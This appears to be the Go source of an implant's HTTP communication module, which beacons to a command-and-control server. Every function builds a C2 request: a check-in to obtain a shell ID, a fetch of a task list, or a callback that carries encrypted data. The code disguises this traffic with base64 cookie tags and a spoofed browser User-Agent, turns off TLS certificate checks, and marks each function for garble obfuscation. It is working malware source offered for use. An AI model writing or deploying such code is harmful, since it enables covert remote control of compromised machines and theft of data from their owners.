package link

import (
	"bytes"
	"crypto/tls"
	"net/http"
	"net/url"
	"sync"
)

/*
HttpLink singleton

Client -> net/http client

ShellId -> Shell identifier, encrypted and base64 encoded

Host -> Host to call back to

Key -> Serpent block cipher key
*/
type HttpLink struct {
	Client  *http.Client
	ShellId string
	Host    string
	Key     []byte
}

var (
	once             sync.Once
	httpLinkInstance *HttpLink
	userAgent        string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
)

/*
Get HttpLink singleton instance
*/
func GetHttpLinkInstance() *HttpLink {
	once.Do(func() {
		httpLinkInstance = &HttpLink{
			Client: &http.Client{
				Transport: &http.Transport{
					// We are working with self signed certificates, so we want to skip CA verification
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				},
			},
		}
	})
	return httpLinkInstance
}

/*
TODO: Make URIs procedural
Right now all requests are to root index "/"
*/

/*
Fetch ShellId from C2
There likely is areas to improve in this function.
The bootstrapping problem is in effect here.
*/
//garble:controlflow flatten_passes=1 junk_jumps=3 block_splits=0
func (hl *HttpLink) NewShellIdRequest() (*http.Request, error) {
	// Parse host URL
	url, err := url.Parse(hl.Host)
	if err != nil {
		return nil, err
	}
	// Create request object
	req, err := http.NewRequest("GET", url.String(), nil)
	if err != nil {
		return nil, err
	}
	// Set Cookie header
	req.Header.Set("Cookie", "Q2hlY2tJbg==") // CheckIn
	return req, nil
}

/*
Fetch tasks from C2
Will respond with json marshalled list of tasks
*/
//garble:controlflow flatten_passes=2 junk_jumps=1 block_splits=1
func (hl *HttpLink) NewTasksRequest() (*http.Request, error) {
	// Parse host URL
	url, err := url.Parse(hl.Host)
	if err != nil {
		return nil, err
	}
	// Create request object
	req, err := http.NewRequest("GET", url.String(), nil)
	if err != nil {
		return nil, err
	}
	// Set Cookie header
	req.Header.Set("Cookie", "R2V0VGFza3M=") // GetTasks
	// Set Authorization header
	req.Header.Set("Authorization", hl.ShellId)
	return req, nil
}

/*
Call back to C2
Expects encrypted call back data
*/
//garble:controlflow flatten_passes=1 junk_jumps=3 block_splits=0
func (hl *HttpLink) NewCallBackRequest(data []byte) (*http.Request, error) {
	// Parse host URL
	url, err := url.Parse(hl.Host)
	if err != nil {
		return nil, err
	}
	// Create new reader with data
	dataReader := bytes.NewReader(data)
	// Create request object
	req, err := http.NewRequest("GET", url.String(), dataReader)
	if err != nil {
		return nil, err
	}
	// Set Cookie header
	req.Header.Set("Cookie", "Q2FsbEJhY2s=") // CallBack
	// Set Authorization header
	req.Header.Set("Authorization", hl.ShellId)
	return req, nil
}

/*
Send Http request over link
*/
//garble:controlflow flatten_passes=1 junk_jumps=3 block_splits=0
func (hl *HttpLink) SendRequest(req *http.Request) (*http.Response, error) {
	// Set User-Agent header
	req.Header.Set("User-Agent", userAgent)
	// Send request
	resp, err := hl.Client.Do(req)
	if err != nil {
		return nil, err
	}
	return resp, nil
}
